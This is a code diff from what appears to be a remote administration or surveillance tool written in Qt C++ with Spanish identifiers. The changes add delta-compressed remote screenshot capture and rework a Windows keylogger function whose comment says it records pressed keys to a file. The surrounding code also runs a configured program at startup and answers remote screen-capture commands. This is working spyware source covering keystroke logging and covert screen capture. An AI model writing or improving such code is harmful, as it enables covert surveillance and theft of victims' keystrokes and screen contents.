@@ -98,6 +98,9 @@ void MainWindow::inicio(){
     log.close();
     verTecla.setInterval(50);
     this->verTecla.start();
+    captura1 = screenShot();
+    captura1.fill(QColor(0,0,0).rgba());
+    sincroniza = 0;
     if(this->ejecutar != "noejecutar") //Ejecutar un programa al inicio
     {
         QProcess::startDetached(this->ejecutar);
@@ -437,12 +440,36 @@ void MainWindow::llegadaDatosEscritorio(){
 
     if (parametros[0] == "capturar")
     {
+        int i,j;
         QPixmap captura;
         captura = screenShot();
         buffer = new QBuffer(&bytes);
         connect(buffer,SIGNAL(bytesWritten(qint64)),this,SLOT(datosEscritos()));
         buffer->open(QIODevice::ReadWrite);
-        captura.save(buffer,"jpg",parametros[1].toInt());
+        QImage imagen1;
+        QImage imagen2;
+        imagen1 = captura1.toImage();
+        imagen2 = captura.toImage();
+        QImage imagen3(imagen2.width(),imagen2.height(), QImage::Format_RGB32);
+        imagen3.fill(QColor(255, 192, 203).rgb());
+        for(i=0;i<captura1.width();i++)
+        {
+            for(j=0;j<captura1.height();j++)
+            {
+                if(imagen1.pixel(i,j) != imagen2.pixel(i,j))
+                {
+                    imagen3.setPixel(i,j,imagen2.pixel(i,j));
+                }
+            }
+        }
+        imagen3.save(buffer,"jpg",parametros[1].toInt());
+        captura1 = captura;
+        sincroniza++;
+        if(sincroniza == 10)
+        {
+            captura1.fill(QColor(0,0,0).rgba());
+            sincroniza = 0;
+        }
     }
 }
 void MainWindow::llegadaDatosWebcam()
@@ -623,12 +650,13 @@ void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
 }
 void MainWindow::escucharTeclas()
 {
+    #ifdef Q_WS_WIN
     /** Esta función comprueba que teclas hay pulsadas y las guarda en un archivo **/
+
         log.open(QFile::Append);
         char num;
-        #ifdef Q_WS_WIN
         num = comprobarTeclas();
-        #endif
+
         if(num != 0)
         {
             cadenaa.append(num);
@@ -636,5 +664,6 @@ void MainWindow::escucharTeclas()
             cadenaa.clear();
             log.close();
         }
+        #endif
 }
 
